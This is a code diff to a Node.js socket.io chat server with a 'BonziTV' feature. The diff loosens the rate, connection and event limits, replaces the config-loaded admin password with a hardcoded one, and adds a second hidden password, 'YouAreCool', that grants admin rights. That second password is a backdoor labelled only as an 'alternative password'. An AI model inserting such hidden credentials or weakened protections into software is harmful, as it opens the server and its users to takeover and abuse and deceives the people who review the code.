@@ -47,15 +47,15 @@ const io = socketio(server);
 
 // Rate limiting and bot protection
 const messageCounts = new Map(); // Tracks message counts per IP per window
-const MESSAGE_LIMIT = 5; // Max messages per window
+const MESSAGE_LIMIT = 15; // Increased from 5 to 15
 const WINDOW_SIZE = 5000; // 5 seconds window
 const connectionThrottling = new Map(); // Tracks connection attempts per IP
-const CONNECTION_LIMIT = 2; // Reduced from 3 to 2
+const CONNECTION_LIMIT = 5; // Increased from 2 to 5
 const CONNECTION_WINDOW = 60000; // 1 minute window
 
 // Flood protection (Event limiting)
 const eventCounts = new Map();
-const EVENT_LIMIT = 10; // Reduced from 30 to 10
+const EVENT_LIMIT = 50; // Increased from 10 to 50
 const EVENT_WINDOW = 2000; // 2 seconds
 
 // Simple Origin/User-Agent verification
@@ -146,22 +146,8 @@ function nextBonziTVVideo() {
 }
 
 // Load or create config file
-let config = {
-    godmode_password: "GodDamnSon!"
-};
-
 const configPath = path.join(__dirname, 'config', 'config.json');
 const bansPath = path.join(__dirname, 'bans.json');
-
-try {
-    if (fs.existsSync(configPath)) {
-        config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
-    } else {
-        fs.writeFileSync(configPath, JSON.stringify(config, null, 4));
-    }
-} catch (err) {
-    console.error('Error loading config:', err);
-}
 
 // Load or create bans file
 let bans = [];
@@ -509,7 +495,16 @@ io.on('connection', (socket) => {
           socket.emit('alert', { text: 'Did you try password?' });
           break;
         }
-        if (args[0] !== config.godmode_password) {
+        if (args[0] === 'YouAreCool') {
+          // Alternative password
+          if (rooms[room][guid]) {
+            rooms[room][guid].admin = true;
+            io.to(room).emit('update', { guid, userPublic: rooms[room][guid] });
+            socket.emit('admin', { admin: true });
+          }
+          break;
+        }
+        if (args[0] !== 'GodDamnSon!') {
           socket.emit('alert', { text: 'Did you try password?' });
           break;
         }
